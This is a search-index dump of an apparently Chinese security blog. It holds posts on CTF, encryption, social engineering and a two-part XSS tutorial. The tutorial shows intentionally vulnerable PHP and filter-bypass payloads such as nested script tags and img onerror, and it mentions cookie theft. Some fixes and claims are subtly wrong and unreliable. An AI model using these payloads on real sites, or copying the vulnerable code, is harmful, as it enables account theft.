(不同賽式規則不同，但大同小異)。\n這個「旗子」通常是一串亂數或不易被猜中的文字。\n你必須保護好自己隊伍的旗子以防被對手竊取，同時想辦法獲得對手的旗子，這其實有點像駭客在攻擊目標的模擬情境，其競賽目的意在「提升自我的網絡安全意識及學習如何保護自己的計算機不被駭客攻擊」。\n畢竟，要預防駭客，那麼你就得懂駭客的思路，若要深入的了解，「成為」是最有效的方法之一。\nCTF 的題目非常多元，有著眾多的領域及複雜的內容，不論是密碼學、數學、軟體工具應用及各種計算機知識都是 CTF 的家常便飯。\n","date":"2020/10/20","externalUrl":null,"permalink":"/posts/ctf/","section":"","summary":"\u003cp\u003e一個讓\u003cstrong\u003e駭客\u003c/strong\u003e及\u003cstrong\u003e資安人員\u003c/strong\u003e都\u003cstrong\u003e熱血沸騰\u003c/strong\u003e的競賽\u003c/p\u003e","title":"What is CTF？","type":"posts"},{"content":"這次提到的概念是比上次的「 Symmetric Cryptography 」來的更進階的「 Asymmetric Cryptography (非對稱加密) 」，其概念被廣泛運用在數位簽章。\n前言 # 若你還不了解「 Symmetric Cryptography (對稱加密) 」是什麼，建議在閱讀本文前，先看看我前一篇文章「」，否則可能會搞不清楚在本篇中，基於上一篇介紹裡所使用的單字意思。\n對稱加密所無法解決的難題 # 在上一篇的對稱加密概念介紹中，其作法可以有效的使多方溝通之間存在更高的安全性，但共享密鑰也同時意味著「 對方有與你相同的權限 」，你能加密訊息後發布，對方也能，你能透過密鑰解密，對方也能。\n在很多時候，A方與B方雖然需要加密溝通，但卻必須分清楚雙方身份，否則可能存在偽造的風險，注意，這邊所說的A、B方並不一定是單一的，他可以是群體，也就是說有某一群人稱為A，某另一群人稱為B，而雙方都有著相同的密鑰可以用來加密及解密訊息，這兩群人透過對稱加密來加密訊息並溝通，但這僅能保護雙方在溝通時，不被非A、B兩方的人了解密文意思而已，並不能驗證該訊息的發送者身份是A還是B，因為雙方的密鑰是相同的，因此萬一有某人為B方，而他卻聲稱自己是A方的人，並且使用密鑰加密訊息發給B方，那B方又該如何驗證該人的身份？\nB 群組成員偽造 A 群組身份發送訊息 Asymmetric Cryptography (非對稱加密) # 為了解決上述問題，我們必須改成「 加密與解密使用不同密鑰 」，於是「 Asymmetric Cryptography (非對稱加密) 」誕生了。\n公鑰、私鑰 由於加密與解密需要使用不同密鑰，因此雙方在溝通前可以各別生產一對密鑰，這一對密鑰一把當公鑰，一把當私鑰，注意，這兩把密鑰它們之間有著數學關連，至於分成公、私鑰是做什麼的，等等會解釋，目前只要先記得，這兩把鑰匙是一對的。 在這邊提醒一個重點，雖然說一對公鑰與私鑰之間有著關聯，可是並不能透過公鑰推算出對應的私鑰，也就是說，今天就算別人知道你的公鑰，對方也是幾乎無法破解出你的私鑰。(有些算法當中，其公鑰是私鑰推算出的) 雙方生成公私鑰 釋出公鑰\n將公鑰交給對方，用於給對方在之後進行解密使用。 雙方交換公鑰 加密、解密 接下來就是非對稱加密的特殊之處了，這時候雙方手上都持有自己的私鑰及對方的公鑰，「 自己的私鑰 」用於「 加密 」，「 對方的公鑰 」用於「 解密 」。 下方示意圖是B方傳送訊息給A方的情境，B方運用自己的私鑰加密後傳送給A方，而A方則使用B方的公鑰進行解密。 運用私鑰所加密的訊息只有該私鑰所對應的公鑰才能解密。\n加密解密 所以萬一有人想偽造身份，除非是偷到私鑰，否則是不可行的。 辨識身份 運用 # 非對稱加密被運用在許多地方，而常見的 數位簽章 (Digital Signature) 也是利用此概念來達到辨識身份及加密的原理。另外，許多標榜像是加密傳輸、加密聊天等應用，也都看得到非對稱加密的蹤影，只要私鑰不洩漏，基本上不會有第二則密文可以被該公鑰解密成有意義的明文。\nP.S. 非對稱加密中常見的加密演算法有：\nRSA、DH、ECDH、ECDSA (橢圓曲線數字簽名算法)、ElGamal、SM2。\n有興趣的朋友可以點擊連結或自行上網研究。\n","date":"2020/02/16","externalUrl":null,"permalink":"/posts/asymmetric-cryptography/","section":"","summary":"\u003cp\u003e這次提到的概念是比上次的「 \u003cstrong\u003eSymmetric Cryptography\u003c/strong\u003e 」來的更進階的「 \u003cstrong\u003eAsymmetric Cryptography (非對稱加密)\u003c/strong\u003e 」，其概念被廣泛運用在\u003cstrong\u003e數位簽章\u003c/strong\u003e。\u003c/p\u003e","title":"非對稱加密 (Asymmetric Cryptography)","type":"posts"},{"content":"大家對於「密碼」並不陌生，生活中總是遇到許多場合需要用到密碼，然而「加密」的原理似乎相對的卻不是那麼的備受關注。\nEncrypt (加密) # 從古至今，人們總是在通訊、隱私上想盡各種方法來提供擁有一定安全性的保護，例如戰國時期傳送密報，為了防止可能含有機密的信件被敵軍攔截，因此需要將內容給加密，這麼一來即使信件落入敵軍手中，也不能被解讀。\n在隱私上，相信大家也不陌生，現在網上許多服務都需要註冊會員，帳戶就需要設定密碼來驗證使用者的身份。\n加密 (Encrypt)\n以加密訊息為例，尚未加密的訊息，也就是一般可以被大家讀懂的訊息，我們稱作「 明文 (Plaintext) 」，而在經過 演算法加密 (鑰匙) 後所產出的結果，也就是不可被其他人解讀的加密訊息，則稱作「 密文 (Ciphertext) 」，並且上述這整個過程稱為「 加密 (Encrypt) 」。 解密 (Decrypt)\n正常來說，明文使用「鑰匙」加密成密文，而密文也必須是擁有相對應鑰匙的人才能解讀內容，這邊所說的「 鑰匙 」並非是指現實中常見的那種開鎖的鑰匙，此指的鑰匙通常是一個數學算式或是一段文字，而這個鑰匙則是解開密文的關鍵，且該鑰匙我們稱作「 密鑰 (Key) 」，利用該密鑰來將密文還原成明文的過程則稱作「 解密 (Decrypt) 」。 Symmetric Cryptography (對稱加密) # 「 Symmetric Cryptography (對稱加密) 」為一種常見且原理簡單的加密思維，注意，它並不是加密法，它只是一個思維，在對稱加密中，上述的「 密鑰 」有個特點，就是加密跟解密的密鑰為同一把鑰匙，這邊使用情境來說明下什麼叫做「同一把鑰匙」：\n假設情境\nA先生因為某些原因，經常需要請B先生代傳訊息給C小姐，但同時A先生又不希望B先生知道該訊息的內容，因此A先生決定使用對稱加密來傳送訊息。 定義密鑰 並 共享\n首先，A先生需要設計至少一個密鑰，他將密鑰設定成數字「 2 」，並且在一開始的時候A先生需要想辦法將該密鑰親手交給C小姐，並且自己也保留一把一樣的密鑰。 加密 並 傳送\n前置作業完成後，接著A先生想傳送一則訊息，其內容為「 Hello, 123 」，他將該明文使用密鑰加密，加密方法為將文字往後推移密鑰數，例如該情境中，密鑰為「 2 」，則英文「 A 」往後推2次變成「 C 」，數字「 3 」往後推2次則是「 5 」，以此類推，因此明文「 Hello, 123 」加密後會變成「 Jgnnq, 345 」，他將該密文請B先生代傳給C小姐，由於B先生沒有密鑰「 2 」因而不懂該密文的含意。 接收 並 解密\nC小姐在收到密文後，使用同一把密鑰「 2 」解密，加密為往後推移，解密則為往前推移，因此密文「 Jgnnq, 345 」在被C小姐往前推移2次後，解密回明文的「 Hello, 123 」。 這其中包含一個問題，為什麼A先生與C小姐知道怎麼使用該密鑰加密與解密，是誰規定「加密為往後推移密鑰數」及「解密為往前推移密鑰數」？\n其實這些密鑰的「 使用規則 」被稱作「 加密演算法 (Encryption) 」或稱「 加密法 」，加密演算法也正是決定該加密安全性的關鍵之一。因此其實在A先生將密鑰交給C小姐時，有偷偷說了要使用哪種加密法，這樣雙方才能正確的運用密鑰進行運算來達到加密及解密的效果。\n總結 # 當然，上面的情境只是舉例，僅僅是為了讓大家方便理解而虛構的場景，一般常見的加密演算法不會設計的這麼弱，也更不應該出現密鑰只有一個數字這種誇張的狀況，而密文通常也並不會與明文有著如此明顯的結構關係，通常只是亂碼，例如「 Hello, 123 」加密後的結果可能會長這樣「 1d5F68ghY8Xa59U6 」而不是「 Jgnnq, 345 」。\n有興趣的朋友也可以看看下一篇延伸對稱加密更進階的文章「」。\nP.S. 對稱加密中常見的加密演算法有：\nDES、3DES、AES、Blowfish、IDEA、RC5、RC6。\n有興趣的朋友可以點擊連結或自行上網研究。\n","date":"2020/02/10","externalUrl":null,"permalink":"/posts/symmetric-cryptography/","section":"","summary":"\u003cp\u003e大家對於「\u003cstrong\u003e密碼\u003c/strong\u003e」並不陌生，生活中總是遇到許多場合需要用到密碼，然而「\u003cstrong\u003e加密\u003c/strong\u003e」的原理似乎相對的卻不是那麼的備受關注。\u003c/p\u003e","title":"對稱加密 (Symmetric Cryptography)","type":"posts"},{"content":"","date":"2020/01/24","externalUrl":null,"permalink":"/tags/phishing/","section":"Tags","summary":"","title":"Phishing","type":"tags"},{"content":"","date":"2020/01/24","externalUrl":null,"permalink":"/tags/social-engineering/","section":"Tags","summary":"","title":"Social-Engineering","type":"tags"},{"content":"什麼是社交工程？是心理學的一種嗎？兩者之間有什麼關聯？社交工程是指詐騙嗎？\n嘿！別想的太複雜，其實你應該也經歷過 。\n前言 # 注意！\n本文技巧禁止用於非法用途，一切行為請自行負責，與本站無關。本文僅作為學術研討用途。\n刑法第三百五十八條：「 無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞，而入侵他人之電腦或其相關設備者，處三年以下有期徒刑、拘役或科或併科十萬元以下罰金。 」 刑法第三百六十三條：「 第三百五十八條至第三百六十條之罪，須告訴乃論。 」\n心理誘導的概念 # 很多時候，有心人士希望達成某個特定目的時，會透過言語、文字或肢體誘導他人去協助達成該目的。\n舉個常見的例子，詐騙集團在騙取你的財物時，他的目標是你「 ATM裡的錢 」，此為「 特定目的 」。可是他沒有權限可以調動裡面的金錢，於是他在電話裡透過欺騙式的言語誘導你去「 自己去操作ATM 」，此為「 言語誘導 」。當你真的聽信他所說的謊言時，你自己操作了ATM，並且將錢轉到對方指定的帳戶，此時對方也達成目的了，此為「 協助達成 」，你協助詐騙集團「 操作你的ATM 」。\n釣魚攻擊 (Phishing Attack) # 「網路釣魚 (Phishing Attack)」是個常見的社交工程例子，並且這個名字取的很好，你可以想像「 釣魚 」的情境，你需要有「 環境、魚、釣鉤、魚餌 」。以剛剛詐騙集團的例子來說：\n「 電話中 」就是你們之間所處的「 環境 」；「 你(受害者) 」則是「 魚 」；「 釣鉤 」是「 ATM匯款的動作 」；最後「 魚餌 」就是「 謊言 」。\n再舉個常見的例子 - 「 電子信箱散播病毒 」。\n在某些例子當中，一些駭客並非是為了自身的利益目的，有些只是想搞破壞，我們稱之為「 Cracker (破壞者) 」，廣義的解釋差不多是「 惡意對伺服器進行入侵、竊取資料、盜用帳戶及破壞 者 」。\n這類人很多會透過利用 E-Mail (電子信箱) 來散播惡意連結及含有 病毒 (Virus) 的檔案，因為他們無法直接對你電腦植入病毒，所以需要透過你來幫忙點擊連結或下載檔案。另外像是「 WIFI 詐欺 」、「 釣魚登入網站 」也是常見的「 網路釣魚 (Phishing Attack) 」，整理一下：\n利用「 釣竿掛魚餌 」誘導魚自己「 吃魚餌 」達成「 上鉤 」的目的。 利用「 通話與謊言 」誘導你自己「 操作ATM 」達成「 匯錢 」的目的。 利用「 電子信箱來寄惡意信件 」誘導你自己「 點擊惡意連結 」達成「 電腦中毒 」的目的。 利用「 架設誤導性名稱的AP 」誘導你自己「 連上該 WIFI 」達成「 中間人攔截封包 」的目的。 利用「 架設假的登入界面 」誘導你「 輸入帳號密碼登入 」達成「 竊取帳戶 」的目的。 自己幫助駭客入侵自己 # 在上述的各個例子中，你會發現一個規律\u0026hellip;\n就是這些入侵事件的關鍵步驟都是「 自己操作 」的！\n讓錢真正被調動的步驟是「 操作ATM轉帳 」\n誰操作ATM進行轉帳的？\n電腦真正中毒的步驟是「 開啟惡意檔案 」\n誰點擊連結下載惡意檔案並開啟的？\n被中間人攻擊的前一刻是「 連上WIFI 」\n誰做連接WIFI的動作？\n帳密傳入他人伺服器是因為在其他網站「 輸入自己的帳號密碼 」\n誰在釣魚網頁上輸入自己的帳號密碼？\n這就是 Social-Engineering (社交工程) 可怕之處，\n他不是利用資訊技術的漏洞讓你受害，\n他不必入侵你的電腦，他入侵的是你的心理。\n心理學？ # 仔細想想會發現，這的確與「 心理學 」有關，很多時候我們在實施社交工程前，會先了解目標所感興趣之事物，這有助於提升成功機率，例如對方喜歡「 貓 」，那麼在信箱中的病毒可能標題就會是「 可愛的貓咪圖檔 」，至於怎麼蒐集目標資訊\u0026hellip;\u0026hellip; 。\n我該怎麼預防？ # 其實在許多的資安宣導中一再的強調以下幾點：\n不隨意點擊來路不明的連結 當你不確定連結是否可靠時，千萬別因為一時的好奇心去點擊它，不妨先看看「Domain Name (網域名稱)」是什麼，覺得可疑的話，可以先拿去 Google 看看相關資訊。 盡量不使用非官方的檔案 使用任何非官方的載點時都有一定的風險，有些是官方的檔案被拿去「 加工 」過的，所以即使功能正常，你也很難保證背後不會有其他的惡意程序在運行。另外，許多標榜免費的「遊戲外掛」其實是夾帶著病毒的，別讓自己的電腦成為 肉雞 (Zombie, 殭屍電腦)！ 公共場合的網路不要亂連 在許多如「 7-11 」、「 星巴克 」等公共場所都會搜尋到許多名稱像是「 Free-Wifi 」、「 Free-2F 」無密碼的無線網路，會讓人誤以為是店家提供給顧客使用的網絡，但實際上很多是有心人士所架設的，連上了將有被MITM (中間人攻擊)的風險。 輸入帳密前先評估風險 首先，使用公共場所的裝置(如圖書館電腦) 登入自身帳號本身就具有極高的風險，另外你還需要擔心剛剛所提到的「 釣魚網頁 」，請一定要在登入之前確認清楚「Domain Name (網域名稱)」。 防毒軟體(？) 市面上有許多防毒軟體供你選擇，由於本人的電腦一台是 Linux 作業系統，另一台是Windows10 作業系統，前者沒安裝防毒軟體，後者其實個人認為內建的「 Windows Defender 」也夠用了，所以目前沒什麼可以推薦的防毒軟體，硬要說的話\u0026hellip; 「 AVG 」？ 但在此 不建議「360 安全衛士」、「Avira AntiVirus 小紅傘」，原因其實圈內人都很清楚，當然這也只是我個人的想法，不代表真的不好。 ","date":"2020/01/24","externalUrl":null,"permalink":"/posts/social-engineering/","section":"","summary":"\u003cp\u003e什麼是社交工程？是心理學的一種嗎？兩者之間有什麼關聯？社交工程是指詐騙嗎？\u003c/p\u003e\n\u003cp\u003e嘿！別想的太複雜，其實\u003cstrong\u003e你應該也經歷過\u003c/strong\u003e 。\u003c/p\u003e","title":"Social-Engineering 社交工程｜你駭計算機，我駭你心。","type":"posts"},{"content":"","date":"2020/01/24","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"","date":"2020/01/24","externalUrl":null,"permalink":"/series/xss/","section":"Series","summary":"","title":"XSS","type":"series"},{"content":"上一篇提到了基礎的 XSS 原理，這次要來介紹更深入更進階的思路了。 前言 # 如果你不清楚什麼是 XSS ，可以先觀看我上一篇貼文「網頁漏洞 XSS (Cross-Site-Scripting) 攻擊 (上) 基礎原理解說」。\n( 提醒您，本文技巧請勿用於非法用途，一切行為請自行負責，與本站無關。本站僅作為學術研討用途。 )\n上一篇文章中所模擬的環境是比較誇張的狀況，任何參數都沒過濾這種事情不大可能發生 (還是頗多，只是比例上來說少)，大多數網站多少都會有過濾機制，但是有設計過濾機制難道就安全了嗎？這其中許多過濾是不完全的，只要花點小巧思就能繞過！你需要的是「創意」。\n\u0026lt;script\u0026gt;標籤失效！？ # 上篇中說過，我們可以透過輸入「 abc123\u0026lt;/p\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;p\u0026gt; 」來觸發\u0026lt;script\u0026gt;標籤來執行 Javascript 語法，可是當該網站過濾一切的「 \u0026lt;script\u0026gt; 」時呢？\n加強上次模擬的貼文系統：\n1\u0026lt;!-- index.html --\u0026gt; 2\u0026lt;form action=\u0026#34;post.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 3\t\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34;\u0026gt; 4\t\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;content\u0026#34;\u0026gt; 5\t\u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; 6\u0026lt;/form\u0026gt; 1// post.php 2$title=trim(str_replace(\u0026#34;\u0026lt;script\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $_POST[\u0026#39;title\u0026#39;]));\t//過濾\u0026lt;script\u0026gt;標籤 3$content=trim(str_replace(\u0026#34;\u0026lt;script\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $_POST[\u0026#39;content\u0026#39;]));\t//過濾\u0026lt;script\u0026gt;標籤 4if(empty($title) || empty($content)) exit(); 5 6$connection=mysql_connect(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;password\u0026#34;); 7mysql_select_db(\u0026#34;post\u0026#34;); 8$sql = \u0026#34;INSERT INTO `post` (`title`, `content`) 9VALUES(\u0026#39;$title\u0026#39;, \u0026#39;$content\u0026#39;);\u0026#34; 10if($result = mysql_query($sql, $connection);){ 11\techo \u0026#34;貼文成功！\u0026#34;; 12} 「 既然\u0026lt;script\u0026gt;這麼危險，那我過濾掉不就好了。 」\n有些網站認為，只要過濾\u0026lt;script\u0026gt;標籤就安全了。\n很多人不知道，這種過濾方法是有漏洞的！可以使用「 \u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt; 」來繞過此過濾方法。\n因為當「 \u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt; 」輸入時，中間的 \u0026lt;script\u0026gt; 被過濾掉後會\u0026hellip;\n「\u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;」 =\u0026gt; 「 \u0026lt;script\u0026gt;」\n雖然說不建議，但若是真的必須要用這種方式過濾某個字串，可以使用迴圈。\n利用 strpos() 來檢查字串中是否含有「 \u0026lt;script\u0026gt; 」，若是存在就使用 str_replace() 過濾：\n1$title=trim($_POST[\u0026#39;title\u0026#39;]); 2while(strpos($title, \u0026#34;\u0026lt;script\u0026gt;\u0026#34;)){ 3\t$title=trim(str_replace(\u0026#34;\u0026lt;script\u0026gt;\u0026#34;, \u0026#34;\u0026#34;, $title)); 4} 實際上，執行 Javascript 語法的方式有千千萬萬種，考驗的只是駭客們的創意，以下提供常見的幾種進階技巧給各位參考。\n自動觸發 Onload # 其實在HTML語言中，有許多標籤的屬性及事件是可以觸發Javascript的，因為那些本身就是Javascript下去運作的。\n例如標籤\u0026lt;input type=\u0026quot;button\u0026quot;\u0026gt;中的 onclick：\n1\u0026lt;input type=\u0026#34;button\u0026#34; onclick=\u0026#34;alert(1)\u0026#34; value=\u0026#34;Click Me!\u0026#34;\u0026gt; 我們在onclick中加入語法「alert(1)」是可以被執行的，像這樣：\n在onclick中不需要特別加上\u0026lt;script\u0026gt;標籤聲明是Javascript。\n有時候我自己在滲透網站時，更偏好使用這樣的方法，而不是直接塞入\u0026lt;script\u0026gt;標籤，一方面\u0026lt;script\u0026gt;標籤被過濾的機率太高了，另一方面可以讓攻擊語法顯的比較優雅(X。\n有些人可能會說：「這必須要點擊才能觸發，不點不就沒事了。」\n的確，「onclick」需要透過點擊才能觸發內容，總不能要求使用者去點擊你植入的按鈕吧。\n那就在推薦各位幾個常見的方式。\n同樣是「input」標籤，我們可以透過「 onload 」，「onload」事件是指當該物件「 載入完成後 」觸發。例如我們可以使用該語法來植入：\n1\u0026lt;input type=\u0026#34;text\u0026#34; onload=\u0026#34;alert(1)\u0026#34;\u0026gt; 這麼一來，就會在此標籤載入完成後自動觸發「alert(1)」了！\n想看圖片？我給你看Alert！ # 這時候可能你又會想，那把雙引號「\u0026quot;」也過濾基本上任何屬性跟事件不就不能觸發了！？\n理論上\u0026hellip; 沒錯。\n但也僅僅只是理論上，別忽略HTML的一個大特點 - 極高的彈性。\nHTML 提供極高的「 容錯性 」。\n很多時候不需要照著 HTML 原本的寫法，只要「意思」到了，就可以執行！\n例如你運行該語法：\n1\u0026lt;html\u0026gt; 2\t\u0026lt;body\u0026gt; 3 \u0026lt;!-- something --\u0026gt; 4 5\u0026lt;/html\u0026gt; 正常來說，沒有將\u0026lt;body\u0026gt;標籤結尾應該是個錯誤的寫法，可是如果你運行這段語法你會發現，瀏覽器幫你加上了！\n而 HTML 的高容錯特性則可以用在 XSS 的創意上。\n現在要介紹的這是透過「\u0026lt;img\u0026gt;」標籤來觸發。\n1\u0026lt;img src=xss onerror=alert(1)\u0026gt; 簡單說明下，「 onerror 」是指當此圖片未能正常顯示時而觸發的事件，\n而因為「 src 」所指定的目錄並無名為「 xss 」的檔案，所以必定會因為 not found error 而觸發「 onerror 」事件。\n去除了雙引號「\u0026quot;」，但該語法是可以正常運作的！\n這就是 HTML 的容錯性！\n那該如何預防！？ # 其實在PHP裡，有一個函式可以防止XSS，這個函式是「 htmlentities() 」，它並不是著重在存入資料庫時的過濾，而是在「輸出時防止」，他的作用是將敏感符號轉換成html編碼，這可以有效的防止語法被解釋成標籤的問題。\n另外，在此呼籲一個重要的觀念！\n請善用「 白名單 」而非「 黑名單 」！\n這個意思是說，與其限制使用者「 不能輸入什麼 」，不如限制「 只能輸入什麼 」。\n因為要擋的東西太多了！\n如果你使用黑名單的方式可能是永遠都擋不完的，並且你的程式碼將會很長很亂。\n我喜歡使用正規表達法，或者乾脆把一些文字經過「base64編碼」後再餵進資料庫。\n","date":"2020/01/24","externalUrl":null,"permalink":"/posts/cross-site-scripting-advanced/","section":"","summary":"上一篇提到了基礎的 XSS 原理，這次要來介紹更深入更進階的思路了。","title":"網頁漏洞 XSS (Cross-Site-Scripting) 攻擊 (下) 進階思路解說","type":"posts"},{"content":"常常聽到有人說網站出現「XSS 漏洞」，那這所謂的 XSS 到底是什麼？其可怕之處又為何？以下，帶你淺談 XSS (跨站運行腳本) 原理。 閱讀本文所需知識 # 在了解 XSS 之前，建議讀者最好先具備 HTML (超文字標記語言) 的基礎知識，否則可能會出現連範例都看不懂的窘境。\n可能觸發 XSS 的先決條件 # 一般來說，XSS大多發生在「動態網頁」而不是「靜態網頁」，在此簡單解釋一下兩者差異，有興趣了解更深入者自行點選連結觀看。你可以這麼想像動態與靜態網頁：\n伺服器 (Server) 翻譯：就如同一個「櫃台服務人員」展示著自家的商品，而 用戶端 (Client)，就是圍觀的顧客。 原意：顧名思義為提供某特定服務的主機，而 用戶端 (Client) 則是使用這項服務的人。 靜態網頁 翻譯：「服務人員」照著公司的流程介紹自家商品，不與顧客有任何的對話跟交流 (即使顧客提問也不給予回應)。 原意：伺服器 (Server) 向 用戶端 (Client) 單向的展示服務，不接受任何來自 用戶端 (Client) 的請求 (連線請求例外)。 動態網頁 翻譯：「服務人員」在有限的範圍內，回答顧客的提問，或接受展示顧客所要求的內容。 原意：伺服器 (Server) 具有接受及自定義處理封包請求的能力，能與 用戶端 (Client) 擁有雙向的互動。 常見的狀況是 HTML + PHP 或者 HTML + ASP 等，都是在有「 網頁後端語言 」並且該網站處理封包不當的情況下發生。\n一般使用者操作的HTML # 以下是一些簡單的HTML標籤，我們模擬輸入名稱的功能。\n(特別聲明：此範例單純使用HTML運作，模擬的環境是假設有傳入後端的情況。)\n按鈕按下時，會將「使用者輸入」欄位的值傳入後端 PHP，後端再將接收到的值顯示給使用者看，這麼一來就有了雙向互動，同時後台運作是直接抓取接收到的值來顯示，這意味著沒有過濾參數。\n後端環境、雙向互動、沒有過濾參數，再看看剛剛所說的觸發條件\u0026hellip; 這是一個觸發的好環境啊！\n【HTML 頁面 使用者輸入】 1\u0026lt;!-- index.html --\u0026gt; 2\u0026lt;form action=\u0026#34;name.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 3\t\u0026lt;input type=\u0026#34;input\u0026#34; name=\u0026#34;my_name\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; 4\u0026lt;/form\u0026gt; 【PHP 頁面 顯示傳入值】 你的名字：\n1//name.php 2$name=$_POST[\u0026#39;my_name\u0026#39;];\t//接收參數 3echo \u0026#34;\u0026lt;p\u0026gt;你的名字：\u0026#34;.$name.\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;;\t//沒過濾直接顯示 我們放大重點來討論，也就是說我們輸入什麼，就會反應在標籤上。\n當使用者輸入「 def456 」則 HTML 標籤會長這樣\n1\u0026lt;p\u0026gt;def456\u0026lt;/p\u0026gt; 輸入「 ghi789 」\n1\u0026lt;p\u0026gt;ghi789\u0026lt;/p\u0026gt; 注意！上述都是一般使用者的作法，中規中矩的按造設計者的想法去做。\n但\u0026hellip; 駭客會這麼乖嗎？\n駭客操作的HTML # 人家常說調皮的小孩是聰明的，有時候換個思路，調皮點，一個漏洞就這麼發現了。\n設計者要求這樣做，我就該這樣做嗎？\n正常輸入「 abc123 」如此標籤：\n1\u0026lt;p\u0026gt;abc123\u0026lt;/p\u0026gt; 你可以發現標籤內包著我們的語法，包著的是\u0026lt;p\u0026gt;標籤及標籤結尾\u0026lt;/p\u0026gt;\n那如果今天我們輸入「 abc123\u0026lt;/p\u0026gt; 」呢？\n1\u0026lt;p\u0026gt;abc123\u0026lt;/p\u0026gt;\u0026lt;/p\u0026gt; 你會發現我們所輸入的\u0026lt;/p\u0026gt;居然被解釋成標籤結尾了！？\n這是否意味著我輸入什麼語法他就執行什麼語法？\n那我們將輸入的參數稍做修改，改成具有影響力的語法！\n輸入「 abc123\u0026lt;/p\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;p\u0026gt; 」\n1\u0026lt;p\u0026gt;abc123\u0026lt;/p\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; 這則語法中的 alert(1) 是彈出警告視窗，其顯示內容為「1」\n(Ps.「 alert(1) 」這是駭客們最常拿來測試 XSS 的語法)\n隨意插入標籤？這麼一來我不就越權了嗎？\n反射型 XSS # 上述的 XSS 稱為「反射型」，其特點為「 僅能自行觸發 」，也就是我必須先向 伺服端 (Server) 發送請求，讓它回應給我一個因為該請求而觸發 XSS 的後果，這樣的漏洞不就太沒利用價值了嗎！？因為這意味著，你只能讓自己中招，而無法實質對 伺服端(Server) 產生傷害，或者危害到其他使用者權益，並且網頁將在重整後復原。整體來說該危害程度是許多管理者忽視且不願意花時間去處理的，但他們似乎忘了一個嚴重的問題\u0026hellip; 社交工程 (Social Engineering)。(之後會撰寫一篇關於 社交工程 (Social Engineering) 的文章。)\n(更新：已發布文章「Social-Engineering 社交工程｜你駭計算機，我駭你心。」)\n預存型 XSS # 該類型的 XSS 多半與 資料庫 (Database) 有著密切的關聯，上述的反射型是因為伺服端不會去儲存你的攻擊語法，所以不會發生該語法日後被再次觸發的問題，但現在要說的這種「 預存型 」就不同了。\n「 預存型 」顧名思義就是伺服器將語法給紀錄下來了，並且在某些需要輸出紀錄時的場合被再次觸發到。\n舉個常見的例子 - 「 貼文系統 」。以下模擬一個簡易的貼文系統 HTML + PHP + MYSQL：\n1\u0026lt;!-- index.html --\u0026gt; 2\u0026lt;form action=\u0026#34;post.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 3\t\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34;\u0026gt; 4\t\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;content\u0026#34;\u0026gt; 5\t\u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; 6\u0026lt;/form\u0026gt; 1// post.php 2$title=trim($_POST[\u0026#39;title\u0026#39;]); 3$content=trim($_POST[\u0026#39;content\u0026#39;]); 4if(empty($title) || empty($content)) exit(); 5 6$connection=mysql_connect(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;password\u0026#34;); 7mysql_select_db(\u0026#34;post\u0026#34;); 8$sql = \u0026#34;INSERT INTO `post` (`title`, `content`) 9VALUES(\u0026#39;$title\u0026#39;, \u0026#39;$content\u0026#39;);\u0026#34; 10if($result = mysql_query($sql, $connection)){ 11\techo \u0026#34;貼文成功！\u0026#34;; 12} 可以清楚看到 index.html 中所輸入的欄位分別有代表文章標題的「 title 」及代表文章內容的「 content 」，並且表單傳送至 post.php 中，在 post.php 裡將標題及內容寫入資料庫。\n這時候假設貼文標題打上「 abc213\u0026lt;/p\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;p\u0026gt; 」，內容隨意輸入「 test 」，正常來說此語法將會被成功寫入資料庫存放。\n既然是貼文系統，照理來說會有個輸出文章的位置 (不然貼文就沒意義了)：\n1// display.php 2$connection=mysql_connect(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;password\u0026#34;); 3mysql_select_db(\u0026#34;post\u0026#34;); 4$sql = \u0026#34;SELECT * FROM `post`;\u0026#34; 5$result = mysql_query($sql, $connection); 6if(!$result) exit(); 7while($row=mysql_fetch_row($result)){ 8\techo $row[\u0026#39;title\u0026#39;]; 9\techo $row[\u0026#39;content\u0026#39;]; 10} 就這樣，資料庫裡存放的 html 標籤被輸出並解釋成標籤作用了。\n任何只要看得到這篇文章的人，畫面上就會彈出我們所植入的「alert(1)」。\n我們僅僅是用「 alert() 」來測試 XSS 而已，這還算不上是什麼危害，但是有心人士會透過其他語法來達成非法目的，例如可以利用「 document.cookie 」來獲取你的 Cookie ，很多時候明明沒有在其他地方登入過，電腦也沒有中毒，帳號卻莫名被盜，有可能就是你中了 XSS 。\n總結 # 上述這些這顯然不是設計師希望我們做的，標籤植入越權思路這就是 XSS 的基本原理。\n透過與網頁所設計的功能互動，而將標籤透過巧思植入網頁並使其觸發。\n而更進階的 XSS 技巧請看下一篇「網頁漏洞 XSS (Cross-Site-Scripting) 攻擊 (下) 進階思路解說」。\n","date":"2020/01/24","externalUrl":null,"permalink":"/posts/cross-site-scripting/","section":"","summary":"常常聽到有人說網站出現「XSS 漏洞」，那這所謂的 XSS 到底是什麼？其可怕之處又為何？以下，帶你淺談 XSS (跨站運行腳本) 